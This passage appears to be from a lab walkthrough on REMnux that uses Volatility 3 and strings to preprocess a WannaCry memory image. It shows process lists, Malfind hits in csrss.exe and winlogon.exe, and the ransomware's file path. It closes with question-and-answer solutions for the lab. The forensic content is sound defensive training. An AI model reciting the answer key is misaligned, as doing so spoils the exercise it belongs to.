596    csrss.exe    0x7e410000    0x91000    USER32.dll    C:\WINDOWS\system32\USER32.dll    N/A    Disabled
596    csrss.exe    0x629c0000    0x9000    LPK.DLL    C:\WINDOWS\system32\LPK.DLL    N/A    Disabled
596    csrss.exe    0x74d90000    0x6b000    USP10.dll    C:\WINDOWS\system32\USP10.dll    N/A    Disabled
596    csrss.exe    0x77dd0000    0x9b000    ADVAPI32.dll    C:\WINDOWS\system32\ADVAPI32.dll    N/A    Disabled
596    csrss.exe    0x77e70000    0x93000    RPCRT4.dll    C:\WINDOWS\system32\RPCRT4.dll    N/A    Disabled
596    csrss.exe    0x77fe0000    0x11000    Secur32.dll    C:\WINDOWS\system32\Secur32.dll    N/A    Disabled
596    csrss.exe    0x7e720000    0xb0000    sxs.dll    C:\WINDOWS\system32\sxs.dll    N/A    Disabled
620    winlogon.exe    0x1000000    0x81000    winlogon.exe    \??\C:\WINDOWS\system32\winlogon.exe    N/A    Disabled
620    winlogon.exe    0x7c900000    0xb2000    ntdll.dll    C:\WINDOWS\system32\ntdll.dll    N/A    Disabled
620    winlogon.exe    0x7c800000    0xf6000    kernel32.dll    C:\WINDOWS\system32\kernel32.dll    N/A    Disabled
620    winlogon.exe    0x77dd0000    0x9b000    ADVAPI32.dll    C:\WINDOWS\system32\ADVAPI32.dll    N/A    Disabled
620    winlogon.exe    0x77e70000    0x93000    RPCRT4.dll    C:\WINDOWS\system32\RPCRT4.dll    N/A    Disabled
620    winlogon.exe    0x77fe0000    0x11000    Secur32.dll    C:\WINDOWS\system32\Secur32.dll    N/A    Disabled
620    winlogon.exe    0x776c0000    0x12000    AUTHZ.dll    C:\WINDOWS\system32\AUTHZ.dll    N/A    Disabled
620    winlogon.exe    0x77c10000    0x58000    msvcrt.dll    C:\WINDOWS\system32\msvcrt.dll    N/A    Disabled
620    winlogon.exe    0x77a80000    0x97000    CRYPT32.dll    C:\WINDOWS\system32\CRYPT32.dll    N/A    Disabled
620    winlogon.exe    0x77b20000    0x12000    MSASN1.dll    C:\WINDOWS\system32\MSASN1.dll    N/A    Disabled
620    winlogon.exe    0x7e410000    0x91000    USER32.dll    C:\WINDOWS\system32\USER32.dll    N/A    Disabled
620    winlogon.exe    0x77f10000    0x49000    GDI32.dll    C:\WINDOWS\system32\GDI32.dll    N/A    Disabled
620    winlogon.exe    0x75940000    0x8000    NDdeApi.dll    C:\WINDOWS\system32\NDdeApi.dll    N/A    Disabled
620    winlogon.exe    0x75930000    0xa000    PROFMAP.dll    C:\WINDOWS\system32\PROFMAP.dll    N/A    Disabled
620    winlogon.exe    0x5b860000    0x56000    NETAPI32.dll    C:\WINDOWS\system32\NETAPI32.dll    N/A    Disabled
<---snip--->
```

#### PsScan

This plugin is used to scan for processes present in a particular Windows memory image.

```bash
root@ip-10-10-180-204:/home/ubuntu/Desktop/tasks/Wcry_memory_image# vol3 -f wcry.mem windows.psscan.PsScan
Volatility 3 Framework 2.0.0
Progress:  100.00        PDB scanning finished                        
PID    PPID    ImageFileName    Offset(V)    Threads    Handles    SessionId    Wow64    CreateTime    ExitTime    File output

860    1940    taskdl.exe    0x1f4daf0    0    -    0    False    2017-05-12 21:26:23.000000     2017-05-12 21:26:23.000000     Disabled
536    1940    taskse.exe    0x1f53d18    0    -    0    False    2017-05-12 21:26:22.000000     2017-05-12 21:26:23.000000     Disabled
424    1940    @WanaDecryptor@    0x1f69b50    0    -    0    False    2017-05-12 21:25:52.000000     2017-05-12 21:25:53.000000     Disabled
1768    1024    wuauclt.exe    0x1f747c0    7    132    0    False    2017-05-12 21:22:52.000000     N/A    Disabled
576    1940    @WanaDecryptor@    0x1f8ba58    0    -    0    False    2017-05-12 21:26:22.000000     2017-05-12 21:26:23.000000     Disabled
260    664    svchost.exe    0x1fb95d8    5    105    0    False    2017-05-12 21:22:18.000000     N/A    Disabled
740    1940    @WanaDecryptor@    0x1fde308    2    70    0    False    2017-05-12 21:22:22.000000     N/A    Disabled
1168    1024    wscntfy.exe    0x1fea8a0    1    37    0    False    2017-05-12 21:22:56.000000     N/A    Disabled
544    664    alg.exe    0x2010020    6    101    0    False    2017-05-12 21:22:55.000000     N/A    Disabled
1084    664    svchost.exe    0x203b7a8    6    72    0    False    2017-05-12 21:22:03.000000     N/A    Disabled
596    348    csrss.exe    0x2161da0    12    352    0    False    2017-05-12 21:22:00.000000     N/A    Disabled
348    4    smss.exe    0x2169020    3    19    N/A    False    2017-05-12 21:21:55.000000     N/A    Disabled
620    348    winlogon.exe    0x216e020    23    536    0    False    2017-05-12 21:22:01.000000     N/A    Disabled
676    620    lsass.exe    0x2191658    23    353    0    False    2017-05-12 21:22:01.000000     N/A    Disabled
664    620    services.exe    0x21937f0    15    265    0    False    2017-05-12 21:22:01.000000     N/A    Disabled
1024    664    svchost.exe    0x21af7e8    79    1366    0    False    2017-05-12 21:22:03.000000     N/A    Disabled
904    664    svchost.exe    0x21b5230    9    227    0    False    2017-05-12 21:22:03.000000     N/A    Disabled
1152    664    svchost.exe    0x21bea78    10    173    0    False    2017-05-12 21:22:06.000000     N/A    Disabled
1636    1608    explorer.exe    0x21d9da0    11    331    0    False    2017-05-12 21:22:10.000000     N/A    Disabled
1484    664    spoolsv.exe    0x21e2da0    14    124    0    False    2017-05-12 21:22:09.000000     N/A    Disabled
1940    1636    tasksche.exe    0x2218da0    7    51    0    False    2017-05-12 21:22:14.000000     N/A    Disabled
836    664    svchost.exe    0x221a2c0    19    211    0    False    2017-05-12 21:22:02.000000     N/A    Disabled
1956    1636    ctfmon.exe    0x2231da0    1    86    0    False    2017-05-12 21:22:14.000000     N/A    Disabled
4    0    System    0x23c8830    51    244    N/A    False    N/A    N/A    Disabled
root@ip-10-10-180-204:/home/ubuntu/Desktop/tasks/Wcry_memory_image# 

```

#### Malfind

This plugin is used to lists process memory ranges that potentially contain injected code.

```bash
root@ip-10-10-180-204:/home/ubuntu/Desktop/tasks/Wcry_memory_image# vol3 -f wcry.mem windows.malfind.Malfind
Volatility 3 Framework 2.0.0
Progress:  100.00        PDB scanning finished                        
PID    Process    Start VPN    End VPN    Tag    Protection    CommitCharge    PrivateMemory    File output    Hexdump    Disasm

596    csrss.exe    0x7f6f0000    0x7f7effff    Vad     PAGE_EXECUTE_READWRITE    0    0    Disabled    
c8 00 00 00 8b 01 00 00    ........
ff ee ff ee 08 70 00 00    .....p..
08 00 00 00 00 fe 00 00    ........
00 00 10 00 00 20 00 00    ........
00 02 00 00 00 20 00 00    ........
8d 01 00 00 ff ef fd 7f    ........
03 00 08 06 00 00 00 00    ........
00 00 00 00 00 00 00 00    ........    
0x7f6f0000:    enter    0, 0
0x7f6f0004:    mov    eax, dword ptr [ecx]
0x7f6f0006:    add    byte ptr [eax], al
620    winlogon.exe    0x21400000    0x21403fff    VadS    PAGE_EXECUTE_READWRITE    4    1    Disabled    
00 00 00 00 00 00 00 00    ........
00 00 00 00 00 00 00 00    ........
00 00 00 00 00 00 00 00    ........
00 00 00 00 00 00 00 00    ........
00 00 00 00 00 00 00 00    ........
00 00 00 00 00 00 00 00    ........
00 00 00 00 28 00 28 00    ....(.(.
01 00 00 00 00 00 00 00    ........    
0x21400000:    add    byte ptr [eax], al
0x21400002:    add    byte ptr [eax], al
0x21400004:    add    byte ptr [eax], al
0x21400006:    add    byte ptr [eax], al
0x21400008:    add    byte ptr [eax], al
0x2140000a:    add    byte ptr [eax], al
0x2140000c:    add    byte ptr [eax], al
0x2140000e:    add    byte ptr [eax], al
0x21400010:    add    byte ptr [eax], al
<---snip--->
```

For more information regarding other plugins, you may check [this link](https://volatility3.readthedocs.io/en/stable/volatility3.plugins.html).

Now, you have the plugins running individually and seeing the result. What you will do now is process this in bulk. Remember, one of the investigative practices involves preprocessing evidence and saving the results to text files, right? The question is how?

The answer? Do a loop statement! See the command below.

```bash
root@10.10.180.204:/home/ubuntu/Desktop/tasks/Wcry_memory_image$ for plugin in windows.malfind.Malfind windows.psscan.PsScan windows.pstree.PsTree windows.pslist.PsList windows.cmdline.CmdLine windows.filescan.FileScan windows.dlllist.DllList; do vol3 -q -f wcry.mem $plugin > wcry.$plugin.txt; done
```

Let’s break this command down, shall we?

- We created a variable named `$plugin` with values of each volatility plugin
- Then ran vol3 parameters `-q`, which means quiet mode or does not show the progress in the terminal
- And `-f`, which means read from the memory capture.
- The `$plugin > wcry.$plugin.txt; done` means run volatility with the plugins and output it to a file with wcry at the beginning of the text, followed by the name of the plugins and with an extension of `.txt`. Repeat until the value of variable $plugin is used.

After running the command, you won't see any output from the terminal; you'll see files within the same directory where you ran the command.

#### Preprocessing With Strings

Next, we will preprocess the memory image with the Linux strings utility. We will extract the **ASCII**, 16-bit **little-endian**, and 16-bit **big-endian** strings. See the command below.

```bash
root@10.10.180.204:/home/ubuntu/Desktop/tasks/Wcry_memory_image$ strings wcry.mem > wcry.strings.ascii.txt
root@10.10.180.204:/home/ubuntu/Desktop/tasks/Wcry_memory_image$ strings -e l  wcry.mem > wcry.strings.unicode_little_endian.txt
root@10.10.180.204:/home/ubuntu/Desktop/tasks/Wcry_memory_image$ strings -e b  wcry.mem > wcry.strings.unicode_big_endian.txt
```

The strings command extracts printable ASCII text. The `-e l` option tells strings to extract 16-bit little endian strings. The `-e b` option tells strings to extract 16-bit big endian strings. All three string formats can provide useful information about the system under investigation.

Now, this is ready for analysis, but remember, our goal here in this task is to preprocess the evidence so that any analyst who will investigate this can expedite searches and analysis.

---------------------------------------------------------------------------------------

#### What plugin lists processes in a tree based on their parent process ID?

Answer: `PsTree`

#### What plugin is used to list all currently active processes in the machine?

Answer: `PsList`

#### What Linux utility tool can extract the ASCII, 16-bit little-endian, and 16-bit big-endian strings?

Answer: `strings`

#### By running vol3 with the Malfind parameter, what is the first (1st) process identified suspected of having an injected code?

```bash
root@ip-10-10-180-204:/home/ubuntu/Desktop/tasks/Wcry_memory_image# vol3 -f wcry.mem windows.malfind.Malfind
Volatility 3 Framework 2.0.0
Progress:  100.00        PDB scanning finished                        
PID    Process    Start VPN    End VPN    Tag    Protection    CommitCharge    PrivateMemory    File output    Hexdump    Disasm

596    csrss.exe    0x7f6f0000    0x7f7effff    Vad     PAGE_EXECUTE_READWRITE    0    0    Disabled    
c8 00 00 00 8b 01 00 00    ........
ff ee ff ee 08 70 00 00    .....p..
08 00 00 00 00 fe 00 00    ........
00 00 10 00 00 20 00 00    ........
00 02 00 00 00 20 00 00    ........
8d 01 00 00 ff ef fd 7f    ........
03 00 08 06 00 00 00 00    ........
00 00 00 00 00 00 00 00    ........
```

Answer: `csrss.exe`

#### Continuing from the previous question (Question 6), what is the second (2nd) process identified suspected of having an injected code?

Answer: `winlogon.exe`

#### By running vol3 with the DllList parameter, what is the file path or directory of the binary `@WanaDecryptor@.exe`?

Hint: run vol3 with dlllist parameter then grep for `@WanaDecryptor@.exe`

```bash
root@ip-10-10-180-204:/home/ubuntu/Desktop/tasks/Wcry_memory_image# vol3 -f wcry.mem windows.dlllist.DllList | grep '@WanaDecryptor@.exe'
740gress@WanaDecryptor@    0x400000PDB scan0x3d000n@WanaDecryptor@.exe    C:\Intel\ivecuqmanpnirkt615\@WanaDecryptor@.exe    N/A    Disabled
```

Answer: `C:\Intel\ivecuqmanpnirkt615\@WanaDecryptor@.exe`

### Task 6 -  Conclusion

In this room, we had a hands-on introduction to the REMnux VM, where we could use tools like **oledump.py** for file analysis. We also created a fake network using **INetSim** and preprocessed a memory capture using **volatility** and **strings**. All of these tools are included just inside the REMNux VM! Still, we haven't used many of its tools yet, as we could create different rooms for each to learn and become familiar with it.

On a side note, REMnux Distro mainly focuses on analyses of potentially malicious programs, documents or files, memory, and similar objects.

For additional information, please see the references below.

## References

- [INetSim - Homepage](https://www.inetsim.org/)
- [Macro (computer science) - Wikipedia](https://en.wikipedia.org/wiki/Macro_(computer_science))
- [Object Linking and Embedding - Wikipedia](https://en.wikipedia.org/wiki/Object_Linking_and_Embedding)
- [oledump.py - Homepage](https://blog.didierstevens.com/programs/oledump-py/)
- [REMnux - Documentation](https://docs.remnux.org/)
- [REMnux - Homepage](https://remnux.org/)
- [strings - Linux manual page](https://man7.org/linux/man-pages/man1/strings.1.html)
- [Volatility - Homepage](https://volatilityfoundation.org/the-volatility-framework/)
- [Volatility 2.6 - Documentation](https://github.com/volatilityfoundation/volatility/wiki/Volatility-Documentation-Project)
- [Volatility 2.6 - GitHub](https://github.com/volatilityfoundation/volatility)
- [Volatility 3 - Documentation](https://volatility3.readthedocs.io/en/latest/)
- [Volatility 3 - GitHub](https://github.com/volatilityfoundation/volatility3)
